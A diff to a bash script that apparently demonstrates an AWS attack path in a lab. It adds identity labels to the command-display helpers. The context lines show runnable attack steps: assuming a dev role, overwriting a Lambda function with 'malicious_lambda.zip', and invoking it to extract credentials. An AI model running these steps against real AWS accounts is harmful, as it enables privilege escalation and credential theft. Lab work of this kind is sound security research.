@@ -18,12 +18,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -54,7 +56,7 @@ DEV_ROLE_ARN="arn:aws:iam::${DEV_ROLE_ARN}:role/pl-dev-lambda-invoke-role"
 echo "Assuming role: $DEV_ROLE_ARN"
 
 # Get temporary credentials for the dev role
-show_attack_cmd aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn "$DEV_ROLE_ARN" --role-session-name "lambda-attack-demo" --output json
+show_attack_cmd "Attacker" "aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn "$DEV_ROLE_ARN" --role-session-name "lambda-attack-demo" --output json"
 TEMP_CREDS=$(aws sts assume-role \
     --profile pl-pathfinding-starting-user-dev \
     --role-arn "$DEV_ROLE_ARN" \
@@ -147,7 +149,7 @@ echo "Target function: $LAMBDA_FUNCTION_NAME"
 echo "Using ARN: $LAMBDA_FUNCTION_ARN"
 
 # Update the function code using the full ARN
-show_attack_cmd aws lambda update-function-code --function-name "$LAMBDA_FUNCTION_ARN" --zip-file "fileb://malicious_lambda.zip"
+show_attack_cmd "Attacker" "aws lambda update-function-code --function-name "$LAMBDA_FUNCTION_ARN" --zip-file "fileb://malicious_lambda.zip""
 aws lambda update-function-code \
     --function-name "$LAMBDA_FUNCTION_ARN" \
     --zip-file "fileb://malicious_lambda.zip"
@@ -163,7 +165,7 @@ fi
 echo ""
 echo "📋 Step 5: Invoking malicious Lambda function to extract credentials..."
 
-show_attack_cmd aws lambda invoke --function-name "$LAMBDA_FUNCTION_ARN" --payload '{}' /tmp/lambda_response.json
+show_attack_cmd "Attacker" "aws lambda invoke --function-name "$LAMBDA_FUNCTION_ARN" --payload '{}' /tmp/lambda_response.json"
 RESPONSE=$(aws lambda invoke \
     --function-name "$LAMBDA_FUNCTION_ARN" \
     --payload '{}' \
